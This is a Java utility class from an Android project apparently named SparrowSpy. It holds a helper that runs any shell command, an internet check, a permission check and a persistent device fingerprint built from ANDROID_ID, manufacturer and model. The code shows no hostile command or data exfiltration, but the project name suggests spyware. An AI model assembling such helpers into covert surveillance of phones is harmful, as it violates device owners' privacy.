package com.tangledbytes.sparrowspy.utils;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Settings.Secure;
import android.util.Log;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Random;

public class Utils {
    private static final String TAG = "Utils";
    private final Context mContext;

    public Utils(Context context) {
        mContext = context;
    }

    public static void showToast(Context context, int id) {
        Toast.makeText(context, id, Toast.LENGTH_LONG).show();
    }

    /**
     * Runs linux commands using android's built in shell.
     */
    public static String shell(String cmd) throws IOException {
        final Process proc = Runtime.getRuntime().exec(cmd);
        // Reads output of command
        final BufferedReader brStdOutput =
                new BufferedReader(new InputStreamReader(proc.getInputStream()));
        // Reads error output (if error occurred) of command
        final BufferedReader brErrOutput =
                new BufferedReader(new InputStreamReader(proc.getErrorStream()));
        StringBuilder output = new StringBuilder();
        String line;
        while ((line = brStdOutput.readLine()) != null)
            output.append("\n").append(line);
        while ((line = brErrOutput.readLine()) != null)
            output.append("\n").append(line);
        output = new StringBuilder(output.toString().trim());
        brStdOutput.close();
        brErrOutput.close();
        return output.toString();
    }

    public void showToast(int id) {
        showToast(getContext(), id);
    }

    /**
     * Performs a ping test to check whether the internet is available or not
     */
    public boolean hasActiveInternetConnection() {
        try {
            // Do ping test
            HttpURLConnection urlc = (HttpURLConnection)
                    (new URL("https://clients3.google.com/generate_204").openConnection());
            return (urlc.getResponseCode() == 204 && urlc.getContentLength() == 0);
        } catch (Exception e) {
            if (e instanceof UnknownHostException)
                return false;
            Log.v(TAG, "Exception occurred while checking for internet connection", e);
            return false;
        }
    }

    public boolean hasPermission(String permission) {
        return getContext().checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
    }

    public String getDeviceId() {
        SharedPreferences prefs = mContext.getSharedPreferences(Constants.DEVICE_ID, Context.MODE_PRIVATE);

        // Check if id is already in preferences
        if (prefs.contains(Constants.DEVICE_ID))
            return prefs.getString(Constants.DEVICE_ID, "def_ID");

        String deviceId = generateDeviceId();
        prefs.edit()
                .putString(Constants.DEVICE_ID, deviceId)
                .apply();
        return deviceId;
    }

    public static String formatEpochTime(long millis) {
        Date date = new Date(millis);
        SimpleDateFormat sdf = new SimpleDateFormat("hh:mm:ss a dd/MM/yy", Locale.getDefault());
        return sdf.format(date);
    }

    public static void sleep(long millis) {
        synchronized (Utils.class) {
            try {
                Thread.sleep(millis);
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }
    }

    private String generateDeviceId() {
        // Generate device id
        @SuppressLint("HardwareIds")
        String deviceId = Secure.getString(getContext().getContentResolver(), Secure.ANDROID_ID);
        if (deviceId == null || deviceId.isEmpty()) {
            Log.w(TAG, "getDeviceUniqueId(), deviceId=null, generating id by other method");
            deviceId = String.valueOf(new Random().nextLong());
        }

        // Format id
        String deviceModel = Build.MODEL;
        String deviceManufacturer = Build.MANUFACTURER;
        deviceId = deviceManufacturer + "_" + deviceModel + "_" + deviceId;
        deviceId = deviceId.replaceAll("[^0-9A-Za-z_]", "");
        return deviceId;
    }

    private Context getContext() {
        if (mContext == null)
            Log.e(TAG, "getContext(): Passed Context is null");
        return mContext;
    }

}